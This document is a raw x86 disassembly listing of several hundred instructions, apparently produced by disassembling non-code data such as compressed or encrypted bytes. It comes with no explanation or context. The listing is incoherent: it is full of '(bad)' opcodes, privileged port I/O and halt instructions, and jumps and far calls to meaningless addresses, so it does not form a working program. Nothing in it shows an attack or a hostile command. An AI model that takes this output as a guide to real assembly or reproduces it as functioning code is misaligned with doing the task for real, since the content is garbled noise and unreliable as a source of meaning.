  42b7dd:	retf   0x2230
  42b7e0:	cmp    esi,DWORD PTR [edi+0x54]
  42b7e3:	(bad)  
  42b7e4:	mov    dl,0x73
  42b7e6:	xchg   esp,ebp
  42b7e8:	adc    al,0x8a
  42b7ea:	jb     0xb75b77f1
  42b7f0:	out    0x16,eax
  42b7f2:	and    DWORD PTR [edx+eiz*2+0x69],esi
  42b7f6:	mov    edx,0x4c8dbc3a
  42b7fb:	loope  0x42b7f7
  42b7fd:	cmp    ah,al
  42b7ff:	push   eax
  42b800:	xlat   BYTE PTR ds:[ebx]
  42b801:	imul   edx,DWORD PTR ds:0x6d1bc47e,0xda5d22b4
  42b80b:	pop    edx
  42b80c:	jae    0x42b80f
  42b80e:	fist   WORD PTR [esi-0x3171027d]
  42b814:	ins    BYTE PTR es:[edi],dx
  42b815:	repz jno 0x42b85d
  42b818:	push   esi
  42b819:	pusha  
  42b81a:	std    
  42b81b:	dec    esp
  42b81c:	mov    ds:0x12e88d91,eax
  42b821:	loopne 0x42b871
  42b823:	push   ebx
  42b824:	adc    ah,ah
  42b826:	lahf   
  42b827:	sbb    ecx,ebx
  42b829:	popf   
  42b82a:	inc    ebx
  42b82b:	sbb    edx,esp
  42b82d:	dec    esi
  42b82e:	jo     0x42b82c
  42b830:	jmp    0x42b899
  42b832:	scas   al,BYTE PTR es:[edi]
  42b833:	aad    0x1f
  42b835:	xchg   esi,eax
  42b836:	lock mov edi,0x8b854ed1
  42b83c:	push   esp
  42b83d:	cwde   
  42b83e:	inc    esp
  42b83f:	mov    al,ds:0xc2e47380
  42b844:	dec    edi
  42b845:	xor    al,0x36
  42b847:	out    dx,eax
  42b848:	mov    cl,0x95
  42b84a:	xchg   BYTE PTR [ecx+0x7265c1a0],ah
  42b850:	adc    ecx,edx
  42b852:	mov    ecx,0xcf7a22cb
  42b857:	push   eax
  42b858:	data16 fisub DWORD PTR cs:[esi+0x2b]
  42b85d:	and    ch,BYTE PTR [edi+0x7d7d18d0]
  42b863:	mov    BYTE PTR [esi+ebx*1-0x56],ah
  42b867:	push   ss
  42b868:	xchg   edx,eax
  42b869:	mov    BYTE PTR ds:0xed1acd0c,dh
  42b86f:	xchg   ecx,eax
  42b870:	test   al,0x9d
  42b872:	or     al,0x31
  42b874:	repnz test cl,0xf7
  42b878:	lahf   
  42b879:	retf   
  42b87a:	retf   
  42b87b:	mov    esi,0xed4df9f
  42b880:	mov    bh,0xfc
  42b882:	jne    0x42b8d2
  42b884:	jno    0x42b830
  42b886:	adc    eax,0x22d7fa17
  42b88b:	cli    
  42b88c:	push   esp
  42b88d:	nop
  42b88e:	mov    bh,0x47
  42b890:	jno    0x42b892
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebx,DWORD PTR [ecx+0x24]
  42b902:	inc    edx
  42b903:	cmp    al,cl
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0xce000001,al
  42b90d:	and    dl,dl
  42b90f:	jns    0x42b957
  42b911:	rol    BYTE PTR [ecx-0x24],1
  42b914:	cmp    DWORD PTR [ebx+0xd],edx
  42b917:	ret    
  42b918:	sbb    ecx,ebx
  42b91a:	das    
  42b91b:	pop    ecx
  42b91c:	jo     0x42b901
  42b91e:	or     al,0x42
  42b920:	push   ebp
  42b921:	cmp    dh,BYTE PTR [ebp-0x7c]
  42b924:	xchg   edx,eax
  42b925:	cmp    BYTE PTR [eax-0x565747d4],bh
  42b92b:	int    0xea
  42b92d:	xchg   esp,eax
  42b92e:	adc    DWORD PTR [esi],0x3ab7aac9
  42b934:	fucomp st(4)
  42b936:	push   cs
  42b937:	js     0x42b8b9
  42b939:	mov    ds:0x675f619,al
  42b93e:	mov    bl,0x72
  42b940:	mov    bl,dl
  42b942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b943:	inc    ebx
  42b944:	repz cmc 
  42b946:	cs ret 
  42b948:	mov    ds:0xf3e2b95c,al
  42b94d:	mov    dh,0xd5
  42b94f:	jl     0x42b91d
  42b951:	mov    al,BYTE PTR [edi+0xc]
  42b954:	mov    ebp,0xd7adf1dd
  42b959:	in     al,dx
  42b95a:	dec    ebx
  42b95b:	fsubp  st(0),st
  42b95d:	sbb    cl,BYTE PTR [ebp+eax*1+0x7b]
  42b961:	push   ebx
  42b962:	mov    bl,0x93
  42b964:	sbb    eax,0xe658612d
  42b969:	int    0x36
  42b96b:	mov    BYTE PTR ds:0x4d1f6a1b,dl
  42b971:	ror    BYTE PTR [eax],1
  42b973:	(bad)  
  42b974:	ins    DWORD PTR es:[edi],dx
  42b975:	cmp    DWORD PTR [esi+eiz*2-0x45919fc9],0xc8fe192c
  42b980:	push   ecx
  42b981:	push   ds
  42b982:	scas   eax,DWORD PTR es:[edi]
  42b983:	mov    bh,0x68
  42b985:	fs sub bh,al
  42b988:	push   cs
  42b989:	xchg   edi,eax
  42b98a:	mov    eax,ds:0x52d7904c
  42b98f:	jmp    0x7748:0xc3ddd025
  42b996:	sbb    edx,DWORD PTR [eax+0x3560f902]
  42b99c:	sbb    eax,0x2198a4e9
  42b9a1:	loop   0x42ba1d
  42b9a3:	pushf  
  42b9a4:	inc    ebx
  42b9a5:	inc    esp
  42b9a6:	out    dx,al
  42b9a7:	test   eax,0xc3e89f6c
  42b9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b9ad:	mov    ds:0x59d94185,eax
  42b9b2:	cld    
  42b9b3:	push   ecx
  42b9b4:	call   0x7d44:0xe37fe55f
  42b9bb:	fcomp  QWORD PTR [edx+0x8ee7b0e]
  42b9c1:	into   
  42b9c2:	cs push ss
  42b9c4:	and    ah,ah
  42b9c6:	ja     0x42b9ae
  42b9c8:	sbb    eax,0x8436e4aa
  42b9cd:	jecxz  0x42b97c
  42b9cf:	in     eax,0x2a
  42b9d1:	mov    cl,0x3d
  42b9d3:	mov    bh,0x0
  42b9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b9d7:	fcmovne st,st(6)
  42b9d9:	sbb    dh,BYTE PTR [ebx-0x6fffc6ef]
  42b9df:	hlt    
  42b9e0:	and    BYTE PTR [esi+ebx*2+0x61e6ceae],cl
  42b9e7:	loope  0x42ba35
  42b9e9:	ins    BYTE PTR es:[edi],dx
  42b9ea:	mov    ds:0x946b92ca,eax
  42b9ef:	push   ebx
  42b9f0:	(bad)  
  42b9f1:	lock mov ds:0x9ac38929,al
  42b9f7:	test   DWORD PTR [edi+0x55531514],ebp
  42b9fd:	pop    edx
  42b9fe:	xchg   esp,eax
  42b9ff:	js     0x42b9b3
  42ba01:	mov    esp,0xaf9b3852
  42ba06:	jg     0x42ba09
  42ba08:	retf   0xc8bf
  42ba0b:	stos   DWORD PTR es:[edi],eax
  42ba0c:	mov    al,ds:0x295246de
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edx+0x70],ebp
  42ba82:	push   ds
  42ba83:	daa    
  42ba84:	int    0xd3
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    eax,0xd4000001
  42ba8d:	adc    al,0xeb
  42ba8f:	mov    ebx,0x10375474
  42ba94:	clc    
  42ba95:	ins    BYTE PTR es:[edi],dx
  42ba96:	ds inc esp
  42ba98:	aad    0x39
  42ba9a:	push   ss
  42ba9b:	add    DWORD PTR [edx-0x66ebd55d],esp
  42baa1:	pop    eax
  42baa2:	loop   0x42ba7a
  42baa4:	push   ecx
  42baa5:	or     DWORD PTR [ecx],edi
  42baa7:	ret    0x98c6
  42baaa:	jb     0x42baa2
  42baac:	das    
  42baad:	in     al,0xaf
  42baaf:	test   al,0x9c
  42bab1:	lea    esp,ds:0x38a576a1
  42bab7:	das    
  42bab8:	dec    edi
  42bab9:	pop    esp
  42baba:	loop   0x42ba79
  42babc:	add    DWORD PTR [edx-0x1],edi
  42babf:	(bad)  
  42bac0:	outs   dx,BYTE PTR ds:[esi]
  42bac1:	xchg   cl,bl
  42bac3:	ret    0x3ee6
  42bac6:	call   0x9794e46b
  42bacb:	push   esi
  42bacc:	int    0x35
  42bace:	push   esi
  42bacf:	je     0x42bac1
  42bad1:	call   0x67eb:0x17d57ea
  42bad8:	dec    esi
  42bad9:	pop    edi
  42bada:	outs   dx,DWORD PTR ds:[esi]
  42badb:	imul   esi,DWORD PTR [edx-0x3cca97e7],0x5dd22bf9
  42bae5:	(bad)  
  42bae7:	pop    ss
  42bae8:	dec    DWORD PTR [ebx+0x60d58acd]
  42baee:	sahf   
  42baef:	test   DWORD PTR [edx],ebp
  42baf1:	jle    0x42baab
  42baf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42baf4:	pop    esp
  42baf5:	jecxz  0x42baf5
  42baf7:	lock pop edi
  42baf9:	sub    edx,DWORD PTR [ecx-0x1615048f]
  42baff:	outs   dx,BYTE PTR ds:[esi]
  42bb00:	push   0xffffffc9
  42bb02:	jg     0x42ba89
  42bb04:	fwait
  42bb05:	aaa    
  42bb06:	mov    al,0x42
  42bb08:	add    al,0xfe
  42bb0a:	mov    WORD PTR [ecx+0x75],cs
  42bb0d:	and    ecx,eax
  42bb0f:	aam    0xa3
  42bb11:	mov    ebx,0x479645af
  42bb16:	xchg   esi,eax
  42bb17:	(bad)  
  42bb18:	out    0xbc,eax
  42bb1a:	ds jmp 0x45f7:0x994733ed
  42bb22:	jge    0x42bb7b
  42bb24:	push   esp
  42bb25:	mov    ebx,edx
  42bb27:	ins    BYTE PTR es:[edi],dx
  42bb28:	daa    
  42bb29:	pusha  
  42bb2a:	xchg   bh,dh
  42bb2c:	test   al,0xeb
  42bb2e:	lock scas al,BYTE PTR es:[edi]
  42bb30:	adc    ah,BYTE PTR [esp+eax*2]
  42bb33:	or     cl,bl
  42bb35:	xchg   esi,eax
  42bb36:	jnp    0x42bb45
  42bb38:	jecxz  0x42bb5f
  42bb3a:	push   ss
  42bb3b:	(bad)  
  42bb3c:	fwait
  42bb3d:	jl     0x42bac8
  42bb3f:	outs   dx,BYTE PTR ds:[esi]
  42bb40:	ret    0xfb62
  42bb43:	sub    BYTE PTR [ebp+edx*1+0x44b9bf6e],0xe4
  42bb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb4c:	aam    0x4d
  42bb4e:	lods   eax,DWORD PTR ds:[esi]
  42bb4f:	inc    eax
  42bb50:	fimul  WORD PTR [ebp-0x4c5c19a9]
  42bb56:	inc    ebp
  42bb57:	jp     0x42badb
  42bb59:	push   ebp
  42bb5a:	xchg   edx,eax
  42bb5b:	adc    eax,0xb7fac53d
  42bb60:	fs dec edi
  42bb62:	loop   0x42bb37
  42bb64:	dec    ebp
  42bb65:	jecxz  0x42baf0
  42bb67:	jnp    0x42bb95
  42bb69:	ja     0x42bb69
  42bb6b:	adc    BYTE PTR [ecx-0x228801c5],ch
  42bb71:	test   BYTE PTR [eax+0x72],cl
  42bb74:	aad    0xa7
  42bb76:	adc    ch,ch
  42bb78:	sbb    BYTE PTR [ebx-0x18504332],bh
  42bb7e:	add    ebx,ebp
  42bb80:	fdivr  st,st(0)
  42bb82:	call   0xe994c47f
  42bb87:	leave  
  42bb88:	dec    edi
  42bb89:	shl    DWORD PTR [edx-0xe6a9f72],1
  42bb8f:	in     al,dx
  42bb90:	ins    DWORD PTR es:[edi],dx
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	test   DWORD PTR [esi-0x57],edx
  42bc03:	mov    dl,0xd2
  42bc05:	aam    0x1
  42bc07:	add    BYTE PTR ds:0x7b000001,al
  42bc0d:	cs mov dl,0x57
  42bc10:	arpl   WORD PTR [ebp-0x45],sp
  42bc13:	enter  0x9224,0x7c
  42bc17:	in     eax,dx
  42bc18:	and    edi,DWORD PTR [edi-0x31]
  42bc1b:	loop   0x42bc0e
  42bc1d:	mov    eax,0x7c4f8090
  42bc22:	mov    ch,0x19
  42bc24:	paddd  mm2,QWORD PTR [edx+edx*2+0x1e994c0a]
  42bc2c:	pop    esi
  42bc2d:	mov    edi,0x6db1ca0
  42bc32:	or     al,0x1
  42bc34:	bound  ebx,QWORD PTR [eax]
  42bc36:	stos   DWORD PTR es:[edi],eax
  42bc37:	imul   eax
  42bc39:	(bad)  
  42bc3a:	mov    WORD PTR [ecx],ds
  42bc3c:	push   0x9a92502f
  42bc41:	xchg   ebp,eax
  42bc42:	neg    ah
  42bc44:	sbb    bl,BYTE PTR [ecx]
  42bc46:	and    DWORD PTR [ebp+edi*4-0x59ac9823],esi
  42bc4d:	mov    ebp,0x7020047f
  42bc52:	repnz pop ecx
  42bc54:	test   BYTE PTR ds:0xb7d56731,al
  42bc5a:	cli    
  42bc5b:	aaa    
  42bc5c:	loope  0x42bc43
  42bc5e:	mov    ebx,0xe3f6cd42
  42bc63:	repnz and esi,0xfffffff7
  42bc67:	mov    dh,0xdb
  42bc69:	dec    edx
  42bc6a:	mov    WORD PTR [eax],gs
  42bc6c:	and    BYTE PTR [ebx+0x5bec716e],ch
  42bc72:	lock rcl ebp,cl
  42bc75:	gs jns 0x42bcd5
  42bc78:	cli    
  42bc79:	retf   0x33a5
  42bc7c:	jno    0x42bcec
  42bc7e:	dec    eax
  42bc7f:	inc    ecx
  42bc80:	mov    cl,0x42
  42bc82:	es jg  0x42bcae
  42bc85:	cmp    eax,esp
  42bc87:	pop    esp
  42bc88:	imul   esp,DWORD PTR [edx],0x4f
  42bc8b:	mov    eax,DWORD PTR [ecx-0x14]
  42bc8e:	or     edx,DWORD PTR [ebx+0xd]
  42bc91:	and    BYTE PTR [eax+eiz*8],dl
  42bc94:	mov    al,ds:0x911bc877
  42bc99:	pop    esi
  42bc9a:	fnstenv [ebx+0xc]
  42bc9d:	shr    DWORD PTR [esi+0xb],0xec
  42bca1:	jne    0x42bcb0
  42bca3:	add    bh,cl
  42bca5:	(bad)
  42bca9:	das    
  42bcaa:	stos   DWORD PTR es:[edi],eax
  42bcab:	int    0xca
  42bcad:	and    BYTE PTR [edi],dl
  42bcaf:	sub    al,0xc6
  42bcb1:	xor    al,0xdd
  42bcb3:	sbb    edx,DWORD PTR [ebx]
  42bcb5:	scas   al,BYTE PTR es:[edi]
  42bcb6:	ins    BYTE PTR es:[edi],dx
  42bcb7:	inc    ecx
  42bcb8:	cmp    eax,0xefce6fe4
  42bcbd:	pop    es
  42bcbe:	cmp    eax,0x8561ce5b
  42bcc3:	mov    cl,0x5d
  42bcc5:	pop    ebx
  42bcc6:	mov    ebp,0x3a28de00
  42bccb:	fcomp  st(0)
  42bccd:	mov    BYTE PTR [eax-0x1b],dl
  42bcd0:	(bad)  
  42bcd1:	stos   DWORD PTR es:[edi],eax
  42bcd2:	sbb    eax,0xae60f937
  42bcd7:	das    
  42bcd8:	repz xchg ebp,eax
  42bcda:	shr    BYTE PTR ds:0xea08d76c,1
  42bce0:	sbb    DWORD PTR [ebx],edx
  42bce2:	jg     0x42bc80
  42bce4:	int    0xf
  42bce6:	or     al,0x9c
  42bce8:	(bad)  
  42bcea:	mov    ch,0x89
  42bcec:	jge    0x42bd6b
  42bcee:	jle    0x42bca0
  42bcf0:	pop    ebp
  42bcf1:	mov    ecx,ebx
  42bcf3:	add    dl,BYTE PTR [ebx]
  42bcf5:	daa    
  42bcf6:	mov    ch,0xf9
  42bcf8:	sbb    BYTE PTR [edx],bh
  42bcfa:	jp     0x42bd32
  42bcfc:	pop    edi
  42bcfd:	data16 ficomp DWORD PTR [esi-0x3efb9ce1]
  42bd04:	nop
  42bd05:	dec    ebx
  42bd06:	adc    ebx,DWORD PTR [ebx-0x5b95d108]
  42bd0c:	js     0x42bcaa
  42bd0e:	xor    dh,BYTE PTR ds:0xa2
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bdc6
  42bd81:	cmp    dh,BYTE PTR ds:0x1d5d77a
  42bd87:	add    BYTE PTR ds:0xdc000001,al
  42bd8d:	push   0xffffffb8
  42bd8f:	mov    dl,bh
  42bd91:	pop    esp
  42bd92:	jo     0x42bd7a
  42bd94:	pop    esi
  42bd95:	mov    al,0x7b
  42bd97:	fbld   TBYTE PTR [edi-0x7501a754]
  42bd9d:	aad    0x12
  42bd9f:	add    edi,DWORD PTR [edi+0x2ef8c917]
  42bda5:	sub    ebp,DWORD PTR [eax-0x6a]
  42bda8:	jb     0x42bdd2
  42bdaa:	add    bh,dl
  42bdac:	mov    al,BYTE PTR [ecx]
  42bdae:	mov    es,WORD PTR [edi+0x2b]
  42bdb1:	loope  0x42bda4
  42bdb3:	xchg   ebp,eax
  42bdb4:	mov    edi,0x803012e7
  42bdb9:	jbe    0x42bdf6
  42bdbb:	nop
  42bdbc:	mov    ch,0x25
  42bdbe:	nop
  42bdbf:	rol    DWORD PTR [ebp+0x2041002e],cl
  42bdc5:	xor    DWORD PTR [ebx],0xffffffe0
  42bdc8:	push   ebp
  42bdc9:	push   0x31
  42bdcb:	cmp    eax,DWORD PTR [ebx-0x55e14413]
  42bdd1:	or     al,0xad
  42bdd3:	pop    ebx
  42bdd4:	adc    al,0x64
  42bdd6:	mov    al,0x58
  42bdd8:	mov    ds:0x294f507a,eax
  42bddd:	aaa    
  42bdde:	in     al,dx
  42bddf:	dec    ecx
  42bde0:	sub    eax,0x8bac93bd
  42bde5:	sbb    eax,0x8816ccc3
  42bdea:	mov    eax,ds:0x3b8efea3
  42bdef:	sub    ebp,DWORD PTR [eax+0x7ffae260]
  42bdf5:	test   DWORD PTR [ecx],eax
  42bdf7:	fwait
  42bdf8:	ins    BYTE PTR es:[edi],dx
  42bdf9:	or     edx,esi
  42bdfb:	dec    ebx
  42bdfc:	lods   al,BYTE PTR fs:[esi]
  42bdfe:	xor    BYTE PTR [edi+esi*2+0x6e7ebd9a],0x68
  42be06:	push   ecx
  42be07:	pop    ebp
  42be08:	mov    al,0x5a
  42be0a:	mov    esp,0x8385aa2e
  42be0f:	pop    ecx
  42be10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be11:	jno    0x42be11
  42be13:	xor    dl,BYTE PTR [esi]
  42be15:	adc    DWORD PTR [esi-0x55eb7c13],ebx
  42be1b:	lods   al,BYTE PTR ds:[esi]
  42be1c:	outs   dx,BYTE PTR ds:[esi]
  42be1d:	stos   DWORD PTR es:[edi],eax
  42be1e:	das    
  42be1f:	mov    bh,0xc7
  42be21:	ins    DWORD PTR es:[edi],dx
  42be22:	dec    ebx
  42be23:	xlat   BYTE PTR ds:[ebx]
  42be24:	test   DWORD PTR [edi-0x1ea638e6],eax
  42be2a:	(bad)  
  42be2b:	pop    esi
  42be2c:	cmc    
  42be2d:	mov    ah,0x72
  42be2f:	xor    ebp,DWORD PTR [edx]
  42be31:	cdq    
  42be32:	imul   eax,DWORD PTR [ebx],0x20
  42be35:	jmp    0xb086c803
  42be3a:	retf   0xe57b
  42be3d:	and    eax,0x22a07c65
  42be42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be43:	call   0x7f61:0xe69b5ab2
  42be4a:	jp     0x42beb5
  42be4c:	pop    ecx
  42be4d:	or     BYTE PTR [edx-0x75],dl
  42be50:	push   ss
  42be51:	mov    WORD PTR [eax+ebp*2],?
  42be54:	je     0x42be02
  42be56:	or     cl,dh
  42be58:	rcr    BYTE PTR [esi],0x14
  42be5b:	cld    
  42be5c:	jno    0x42be04
  42be5e:	(bad)  
  42be5f:	sbb    al,0xf6
  42be61:	leave  
  42be62:	adc    BYTE PTR [esi-0x60],dl
  42be65:	sbb    eax,0x86121482
  42be6a:	ins    DWORD PTR es:[edi],dx
  42be6b:	and    bl,dl
  42be6d:	push   ebp
  42be6e:	lds    esi,FWORD PTR [ebx+0x4d]
  42be71:	cld    
  42be72:	ret    
  42be73:	in     al,dx
  42be74:	push   0x48ec64e2
  42be79:	lock fstp QWORD PTR [esi+0x44]
  42be7d:	jb     0x42beeb
  42be7f:	ds jge 0x42be05
  42be82:	jno    0x42be12
  42be84:	and    al,0x83
  42be86:	adc    dl,BYTE PTR [esi]
  42be88:	jp     0x42be51
  42be8a:	inc    esi
  42be8b:	into   
  42be8c:	and    esp,DWORD PTR [ebp-0x67]
  42be8f:	stos   BYTE PTR es:[edi],al
  42be90:	dec    esp
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bf3c
  42bf01:	push   eax
  42bf02:	popa   
  42bf03:	mov    dh,0xdc
  42bf05:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0x4b000001
  42bf0d:	xor    al,0x3f
  42bf0f:	sbb    BYTE PTR [esi+0x2],dl
  42bf12:	mov    al,ds:0x887b3abd
  42bf17:	lock shr DWORD PTR [ebx],0xc8
  42bf1b:	inc    ebx
  42bf1c:	ror    BYTE PTR [edx-0x46fa2154],1
  42bf22:	push   ebp
  42bf23:	jns    0x42bebb
  42bf25:	add    BYTE PTR [edi+0x31f61048],ch
  42bf2b:	mov    bh,0xce
  42bf2d:	dec    edi
  42bf2e:	addr16 dec ecx
  42bf30:	daa    
  42bf31:	test   al,0xb5
  42bf33:	sbb    BYTE PTR [esp+ebp*8+0x78125af8],cl
  42bf3a:	or     ecx,DWORD PTR ds:0xb18358e8
  42bf40:	cmp    BYTE PTR [ebx+0x473b1343],ch
  42bf46:	push   0x9c911f23
  42bf4b:	mov    ebp,0x35f9ae00
  42bf50:	in     al,dx
  42bf51:	xchg   ebx,eax
  42bf52:	sub    BYTE PTR [esi-0x22],ah
  42bf55:	mov    ebx,DWORD PTR [ebx]
  42bf57:	test   eax,0x8a9027ed
  42bf5c:	ret    0x10dc
  42bf5f:	lods   al,BYTE PTR ds:[esi]
  42bf60:	and    al,0x4a
  42bf62:	daa    
  42bf63:	and    BYTE PTR [edi+0x6273cb4d],bl
  42bf69:	es (bad) 
  42bf6c:	xor    BYTE PTR [ebp+ebx*8+0x266991dd],bh
  42bf73:	xchg   BYTE PTR [edx-0x3c2ef885],ah
  42bf79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf7a:	shl    DWORD PTR [edx+0xbef8842],1
  42bf80:	push   esi
  42bf81:	jmp    0x8b8f:0x498c7424
  42bf88:	jp     0x42bf4e
  42bf8a:	sbb    dh,BYTE PTR [ebx+0x4f]
  42bf8d:	mov    eax,0xcf5c7477
  42bf92:	push   es
  42bf93:	leave  
  42bf94:	dec    edi
  42bf95:	dec    ecx
  42bf96:	out    dx,eax
  42bf97:	add    dh,dh
  42bf99:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf9b:	arpl   WORD PTR [ebx],cx
  42bf9d:	jle    0x42bfa5
  42bf9f:	jo     0x42bf7e
  42bfa1:	ret    0xec37
  42bfa4:	call   0xcedf7e1f
  42bfa9:	sub    edi,esp
  42bfab:	xor    cl,BYTE PTR [edi+0x609be588]
  42bfb1:	and    eax,0x126e593
  42bfb6:	jne    0x42bf67
  42bfb8:	(bad)  
  42bfb9:	jp     0x42bff9
  42bfbb:	mov    BYTE PTR [ebx-0x80],dh
  42bfbe:	arpl   WORD PTR [edi+eiz*4+0x52],di
  42bfc2:	(bad)  
  42bfc3:	push   0xddb3528e
  42bfc8:	mov    edi,0xe0c171b0
  42bfcd:	mov    eax,ds:0xc6aab39d
  42bfd2:	mov    al,0x65
  42bfd4:	push   ss
  42bfd5:	push   eax
  42bfd6:	sub    BYTE PTR ds:0x7f43e8e7,bl
  42bfdc:	jae    0x42bf9e
  42bfde:	out    dx,al
  42bfdf:	cmc    
  42bfe0:	test   eax,0xefb0f930
  42bfe5:	dec    edi
  42bfe6:	stc    
  42bfe7:	adc    al,BYTE PTR [edx+ecx*1-0x2e55b28d]
  42bfee:	sub    eax,0x189dd4bd
  42bff3:	iret   
  42bff4:	out    0x35,eax
  42bff6:	repz les ecx,FWORD PTR [eax+0x30]
  42bffa:	out    dx,al
  42bffb:	aam    0x7b
  42bffd:	shr    BYTE PTR [edi+edx*2-0x4445055c],cl
  42c004:	or     al,BYTE PTR [edi+edx*2+0xcce3f71]
  42c00b:	retf   
  42c00c:	int3   
  42c00d:	jle    0x42c084
  42c00f:	pop    ss
  42c010:	test   eax,0x0
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	add    ah,BYTE PTR [edi-0x281ed3bc]
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0x62000001
  42c08d:	sbb    edi,DWORD PTR [edx+0x504ffe26]
  42c093:	into   
  42c094:	jnp    0x42c0e4
  42c096:	mov    esp,0x184d75e6
  42c09b:	dec    edi
  42c09c:	push   es
  42c09d:	push   ss
  42c09e:	sti    
  42c09f:	ret    0xd6d8
  42c0a2:	push   esp
  42c0a3:	push   esi
  42c0a4:	(bad)
  42c0a7:	xchg   edi,eax
  42c0a8:	and    DWORD PTR gs:[ecx],edi
  42c0ab:	aam    0x47
  42c0ad:	(bad)
  42c0b0:	adc    esi,DWORD PTR [ebx+0x49]
  42c0b3:	push   cs
  42c0b4:	and    al,0x47
  42c0b6:	ret    0x3ebd
  42c0b9:	mov    al,bl
  42c0bb:	mov    al,ds:0x48528257
  42c0c0:	stc    
  42c0c1:	xor    esp,eax
  42c0c3:	lea    ebp,[eax-0x74537786]
  42c0c9:	in     al,0x9b
  42c0cb:	sub    dh,BYTE PTR [edi+0x59]
  42c0ce:	push   ss
  42c0cf:	or     eax,0x4b42db75
  42c0d4:	and    bh,bh
  42c0d6:	rcr    DWORD PTR [esp+esi*4],1
  42c0d9:	fdivr  QWORD PTR [esi-0x30478fa1]
  42c0df:	push   ecx
  42c0e0:	and    eax,0x88779861
  42c0e5:	jge    0x42c119
  42c0e7:	(bad)  
  42c0e8:	mov    dl,0xb5
  42c0ea:	push   edi
  42c0ec:	and    ah,al
  42c0ee:	fistp  DWORD PTR [ebx-0x1c51b426]
  42c0f4:	add    ebp,ecx
  42c0f6:	es pop ecx
  42c0f8:	mov    BYTE PTR [ebp*8+0x399ac312],cl
  42c0ff:	xor    ecx,edx
  42c101:	mov    ch,0x8
  42c103:	inc    esp
  42c104:	lods   eax,DWORD PTR ds:[esi]
  42c105:	cwde   
  42c106:	js     0x42c15b
  42c108:	jmp    0x2eb:0xe3904479
  42c10f:	pop    es
  42c110:	xchg   DWORD PTR [esi-0x2396002b],ecx
  42c116:	push   0x2e
  42c118:	jo     0x42c12d
  42c11a:	or     ebx,eax
  42c11c:	ins    BYTE PTR es:[edi],dx
  42c11d:	dec    ebx
  42c11e:	cmp    eax,0xa50a464c
  42c123:	cwde   
  42c124:	shl    BYTE PTR [ecx-0x73],cl
  42c127:	js     0x42c14d
  42c129:	add    eax,0x7f64d2a3
  42c12e:	inc    esp
  42c12f:	addr16 cdq 
  42c131:	pop    esi
  42c132:	adc    eax,0xc672af1
  42c137:	pop    es
  42c138:	lods   al,BYTE PTR ds:[esi]
  42c139:	or     edi,DWORD PTR [esp+ecx*1+0x4f]
  42c13d:	add    eax,0x8eeba102
  42c142:	jmp    0x196d1196
  42c147:	mov    ecx,0x7439100f
  42c14c:	out    0x33,eax
  42c14e:	hlt    
  42c14f:	inc    ecx
  42c150:	aaa    
  42c151:	and    al,0xe3
  42c153:	sub    BYTE PTR [esi-0x7c],cl
  42c156:	push   esp
  42c157:	out    0x50,eax
  42c159:	jge    0x42c162
  42c15b:	sahf   
  42c15c:	frstor [eax-0x6a]
  42c15f:	pop    esp
  42c160:	xor    BYTE PTR [esi],bh
  42c162:	xlat   BYTE PTR ds:[ebx]
  42c163:	(bad)  
  42c164:	cwde   
  42c165:	sar    cl,0x1
  42c168:	jb     0x42c135
  42c16a:	into   
  42c16b:	push   esp
  42c16c:	jge    0x42c1d6
  42c16e:	mov    ebp,DWORD PTR [ecx-0x319c62d1]
  42c174:	push   ss
  42c175:	retf   
  42c176:	aam    0x32
  42c178:	sub    ch,BYTE PTR [edi-0x5e]
  42c17b:	jnp    0x42c161
  42c17d:	cli    
  42c17e:	mov    al,ds:0x28294546
  42c183:	mov    cl,0x83
  42c185:	stos   BYTE PTR es:[edi],al
  42c186:	adc    al,ah
  42c188:	mov    eax,0xfe15e442
  42c18d:	(bad)  
  42c18e:	ds cdq 
  42c190:	add    DWORD PTR [eax],eax
	...
  42c1f2:	add    BYTE PTR [eax],al
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	pop    edx
  42c201:	iret   
  42c202:	xchg   ebx,eax
  42c203:	push   0x1d8e6
  42c208:	add    eax,0x12000001
  42c20d:	dec    ebp
  42c20e:	outs   dx,DWORD PTR ds:[esi]
  42c20f:	jmp    0x42c19a
